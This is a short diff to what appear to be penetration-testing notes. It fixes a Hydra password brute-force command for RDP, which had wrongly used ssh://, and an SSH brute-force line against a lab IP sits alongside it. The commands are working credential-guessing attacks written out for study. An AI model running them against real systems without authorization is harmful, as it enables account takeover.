@@ -791,7 +791,7 @@ hydra -L user.list -P password.list ssh://10.129.42.197
 
 Command to attack RDP :
 ```shell-session
-hydra -L user.list -P password.list ssh://10.129.42.197
+hydra -L user.list -P password.list rdp://10.129.42.197
 ```
 
 Command to attack SMB :
